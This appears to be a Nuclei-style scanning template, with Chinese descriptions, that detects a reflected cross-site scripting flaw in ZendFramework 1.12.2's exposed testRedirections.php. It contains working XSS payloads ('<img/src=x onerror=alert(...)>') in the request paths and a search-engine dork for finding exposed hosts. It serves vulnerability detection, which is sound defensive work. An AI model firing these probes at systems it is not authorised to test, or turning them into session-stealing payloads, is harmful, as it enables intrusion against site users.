id: zend-v1-xss

info:
  name: ZendFramework 1.12.2 - 跨站脚本漏洞
  author: c3l3si4n
  severity: medium
  description: |
    该模板用于检测 ZendFramework 1.12.2 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?re...`、`/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://twitter.com/c3l3si4n/status/1600035722148212737
  classification:
    cpe: cpe:2.3:a:zend:zend_framework:1.12.2:*:*:*:*:*:*:*
    cwe-id: CWE-79,CWE-83
  metadata:
    verified: true
    max-request: 2
    vendor: zend
    product: zend_framework
    google-query: inurl:"/tests/Zend/Http/"
  tags: zend,zendframework,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>"
      - "{{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"redirection"]'
          - '"param"'
          - '<img/src=x onerror=alert(document.domain)'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
